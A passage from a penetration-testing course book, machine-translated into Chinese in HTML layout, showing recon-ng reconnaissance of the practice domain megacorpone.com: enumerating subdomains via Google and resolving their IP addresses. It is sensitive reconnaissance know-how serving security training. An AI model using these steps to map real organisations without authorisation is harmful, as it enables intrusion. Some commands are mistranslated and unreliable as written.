<div style="position:absolute;top:178742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项 set SOURCE megacorpone.com</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来设置我们的目标域：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:178777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default][google_site_web] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项集 SOURCE megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:178794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来源 =&gt; megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:178814;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 201 - 设置源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:178844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:178878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][默认][google_site_web] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:178912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------------</font></font></nobr></div>
<div style="position:absolute;top:178929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MEGACORPONE.COM</font></font></nobr></div>
<div style="position:absolute;top:178946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------------</font></font></nobr></div>
<div style="position:absolute;top:178963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 Google 上搜索：site:megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:178980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] [host] www.megacorpone.com (&lt;空白&gt;)</font></font></nobr></div>
<div style="position:absolute;top:178997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] [host] vpn.megacorpone.com (&lt;空白&gt;)</font></font></nobr></div>
<div style="position:absolute;top:179014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] [host] www2.megacorpone.com (&lt;空白&gt;)</font></font></nobr></div>
<div style="position:absolute;top:179031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] [host] siem.megacorpone.com (&lt;空白&gt;)</font></font></nobr></div>
<div style="position:absolute;top:179048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 Google 上搜索：site:megacorpone.com -site:www.megacorpone.com -site:vpn.meg</font></font></nobr></div>
<div style="position:absolute;top:179065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">acorpone.com -site:www2.megacorpone.com -site:siem.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:179099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------</font></font></nobr></div>
<div style="position:absolute;top:179116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">概括</font></font></nobr></div>
<div style="position:absolute;top:179133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:179150;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 共找到 4 个（4 个新）主机。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179169;left:370"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 202 - 运行一个模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果反映了我们从 Netcraft DNS 搜索中发现的内容。</font><font style="vertical-align: inherit;">然而，我们并没有浪费我们的</font></font></nobr></div>
<div style="position:absolute;top:179218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间在这里。</font><font style="vertical-align: inherit;">Recon-ng 将结果存储在本地数据库中，这些结果将输入到其他侦察中</font></font></nobr></div>
<div style="position:absolute;top:179237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ng 模块。</font></font></nobr></div>
<div style="position:absolute;top:179270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">show hosts</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令查看存储的数据：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][默认][google_site_web] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回</font></font></font></b></nobr></div>
<div style="position:absolute;top:179339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][默认]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示</font></font></font></b></nobr></div>
<div style="position:absolute;top:179356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示各种框架项</font></font></nobr></div>
<div style="position:absolute;top:179390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：显示 &lt;companies|contacts|credentials|domains|hosts|leaks|locations|netblocks|po</font></font></nobr></div>
<div style="position:absolute;top:179407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rts|个人资料|图钉|存储库|漏洞&gt; </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:179563;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="152"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 152 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:179596;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:180673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:180673;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:180673;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">152</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示主机</font></font></font></b></nobr></div>
<div style="position:absolute;top:179725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:179742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">行号 |    </font></font></nobr></div>
<div style="position:absolute;top:179742;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:179742;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">ip_address | </font><font style="vertical-align: inherit;">地区| </font><font style="vertical-align: inherit;">国家 | </font><font style="vertical-align: inherit;">模块 |</font></font></nobr></div>
<div style="position:absolute;top:179760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:179776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1 | </font><font style="vertical-align: inherit;">www.megacorpone.com |    </font></font></nobr></div>
<div style="position:absolute;top:179776;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179776;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179776;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:179793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2 | </font><font style="vertical-align: inherit;">vpn.megacorpone.com |    </font></font></nobr></div>
<div style="position:absolute;top:179793;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179793;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179793;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:179810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">3 | </font><font style="vertical-align: inherit;">www2.megacorpone.com |    </font></font></nobr></div>
<div style="position:absolute;top:179810;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179810;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179810;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:179827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">4 | </font><font style="vertical-align: inherit;">siem.megacorpone.com |    </font></font></nobr></div>
<div style="position:absolute;top:179827;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179827;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:179827;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">google_site_web |</font></font></nobr></div>
<div style="position:absolute;top:179844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- -------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:179878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 4 行返回</font></font></nobr></div>
<div style="position:absolute;top:179895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[重新配置][默认] &gt; </font></font></nobr></div>
<div style="position:absolute;top:179931;left:389"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 203 - 显示主机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的数据库中有四台主机，但没有关于它们的其他信息。</font><font style="vertical-align: inherit;">也许另一个模块</font></font></nobr></div>
<div style="position:absolute;top:179980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以填写IP地址。</font></font></nobr></div>
<div style="position:absolute;top:180013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场信息</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查 recon/hosts-hosts/resolve </font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场信息 recon/hosts-hosts/resolve</font></font></font></b></nobr></div>
<div style="position:absolute;top:180082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- ------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:180099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:180099;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">侦察/主机-主机/解决    </font></font></nobr></div>
<div style="position:absolute;top:180099;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:180116;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">主机名解析器    </font></font></nobr></div>
<div style="position:absolute;top:180116;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">作者    </font></font></nobr></div>
<div style="position:absolute;top:180133;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">蒂姆·托姆斯 (@lanmaster53)    </font></font></nobr></div>
<div style="position:absolute;top:180133;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本| </font><font style="vertical-align: inherit;">1.0    </font></font></nobr></div>
<div style="position:absolute;top:180150;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">最后更新 | </font><font style="vertical-align: inherit;">2019-06-24    </font></font></nobr></div>
<div style="position:absolute;top:180167;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明 | </font><font style="vertical-align: inherit;">解析主机的 IP 地址。</font><font style="vertical-align: inherit;">更新“主机”表</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">required_keys | </font><font style="vertical-align: inherit;">[]    </font></font></nobr></div>
<div style="position:absolute;top:180201;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">依赖 | </font><font style="vertical-align: inherit;">[]    </font></font></nobr></div>
<div style="position:absolute;top:180218;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">档案    </font></font></nobr></div>
<div style="position:absolute;top:180235;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">[]    </font></font></nobr></div>
<div style="position:absolute;top:180235;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">地位    </font></font></nobr></div>
<div style="position:absolute;top:180252;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">已安装    </font></font></nobr></div>
<div style="position:absolute;top:180252;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:180269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------------------- ------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:180302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[重新配置][默认] &gt; </font></font></nobr></div>
<div style="position:absolute;top:180339;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 204 - recon/hosts-hosts/resolve 的模块信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块描述符合我们的需求，因此我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场安装</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来安装它</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">市场安装 recon/hosts-hosts/resolve</font></font></font></b></nobr></div>
<div style="position:absolute;top:180420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 模块安装：recon/hosts-hosts/resolve</font></font></nobr></div>
<div style="position:absolute;top:180437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 重新加载模块...</font></font></nobr></div>
<div style="position:absolute;top:180457;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 205 - 安装解析模块</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:180515;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“无效命令”错误可能表明我们使用了错误的命令</font></font></i></nobr></div>
<div style="position:absolute;top:180535;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等级。</font><font style="vertical-align: inherit;">如果发生这种情况，跑</font></font></i><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回来</font></font></font></b><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，返回到主侦察-ng的提示，并尝试</font></font></i></nobr></div>
<div style="position:absolute;top:180554;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次命令。 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:180751;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="153"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 153 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:180784;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:181861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:181861;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:181861;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">153</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装模块后，我们可以将其与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块 load</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一起使用</font><font style="vertical-align: inherit;">，并运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">info</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以显示信息</font></font></nobr></div>
<div style="position:absolute;top:180899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于模块及其选项：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块加载 recon/hosts-hosts/resolve</font></font></font></b></nobr></div>
<div style="position:absolute;top:180968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default][resolve] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
<div style="position:absolute;top:181002;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：主机名解析器</font></font></nobr></div>
<div style="position:absolute;top:181019;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：蒂姆·托姆斯 (@lanmaster53)</font></font></nobr></div>
<div style="position:absolute;top:181036;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本：1.0</font></font></nobr></div>
<div style="position:absolute;top:181070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:181087;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析主机的 IP 地址。</font><font style="vertical-align: inherit;">使用结果更新“主机”表。</font></font></nobr></div>
<div style="position:absolute;top:181121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:181138;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前值 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:181155;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------ ------------- -------- -----------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:181171;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源默认    </font></font></b></nobr></div>
<div style="position:absolute;top:181171;left:311"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是输入源（有关详细信息，请参阅“显示信息”）</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:181206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来源选项：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:181223;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认    </font></font></b></nobr></div>
<div style="position:absolute;top:181223;left:247"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL AND ip_address</font></font></b></nobr></div>
<div style="position:absolute;top:181240;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一片空白</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:181256;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;string&gt; 表示单个输入的字符串</font></font></nobr></div>
<div style="position:absolute;top:181273;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;路径&gt;    </font></font></nobr></div>
<div style="position:absolute;top:181273;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含输入列表的文件的路径</font></font></nobr></div>
<div style="position:absolute;top:181290;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">query &lt;sql&gt; 数据库查询返回一列输入</font></font></nobr></div>
<div style="position:absolute;top:181324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注释：</font></font></nobr></div>
<div style="position:absolute;top:181341;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 注意：名称服务器必须是 IP 形式。</font></font></nobr></div>
<div style="position:absolute;top:181361;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 206 - 安装和查看 recon/hosts-hosts/resolve</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:181390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从上面的输出可以清楚地看出，该模块将解析主机的 IP 地址。</font></font></nobr></div>
<div style="position:absolute;top:181423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要提供我们想要解析的 IP 地址作为我们的来源。</font><font style="vertical-align: inherit;">我们有四种选择</font></font></nobr></div>
<div style="position:absolute;top:181442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为源设置：默认值、字符串、路径和查询。</font><font style="vertical-align: inherit;">每个选项旁边都有一个描述作为</font></font></nobr></div>
<div style="position:absolute;top:181462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 206 所示。例如，在“google_site_web”recon-ng 模块中，我们使用了一个字符串</font></font></nobr></div>
<div style="position:absolute;top:181481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">价值。</font></font></nobr></div>
<div style="position:absolute;top:181514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，这次我们要利用数据库。</font><font style="vertical-align: inherit;">如果我们使用“默认”值，recon-ng 将</font></font></nobr></div>
<div style="position:absolute;top:181533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在其数据库中查找主机信息以查找具有主机名但没有 IP 的任何记录</font></font></nobr></div>
<div style="position:absolute;top:181553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址。</font></font></nobr></div>
<div style="position:absolute;top:181585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 203 所示，我们有四个没有 IP 地址的主机。</font><font style="vertical-align: inherit;">如果我们选择“默认”来源，</font></font></nobr></div>
<div style="position:absolute;top:181604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该模块将自动针对我们数据库中的所有四个主机运行。</font></font></nobr></div>
<div style="position:absolute;top:181638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们通过将我们的源设置为“默认”然后运行模块来尝试一下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:181672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[recon-ng][default][resolve] &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:181689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] www.megacorpone.com =&gt; 38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:181706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] vpn.megacorpone.com =&gt; 38.100.193.77</font></font></nobr></div>
<div style="position:absolute;top:181723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] www2.megacorpone.com =&gt; 38.100.193.79</font></font></nobr></div>
